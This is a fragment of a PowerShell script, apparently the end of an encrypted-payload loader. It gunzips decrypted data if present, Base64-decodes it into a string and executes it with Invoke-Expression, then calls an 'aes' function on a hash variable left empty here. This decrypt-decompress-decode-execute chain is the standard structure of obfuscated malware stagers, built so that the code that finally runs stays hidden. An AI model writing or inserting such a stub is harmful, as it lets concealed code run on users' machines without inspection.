		$DataStream = New-Object System.IO.MemoryStream($DecryptedInputData, $false)
		if ($DecryptedInputData[0] -eq 0x1f)
		{
			$DataStream = New-Object System.IO.Compression.GZipStream($DataStream, [IO.Compression.CompressionMode]::Decompress)
		}
		
		$StreamReader = New-Object System.IO.StreamReader($DataStream, $true)
		$OutputString = ([System.Text.Encoding]::unicode.GetString([System.Convert]::FromBase64String($StreamReader.ReadToEnd())))
		iex $Outputstring
	}
	
	
	$hash = ""
	aes -InputString $hash
}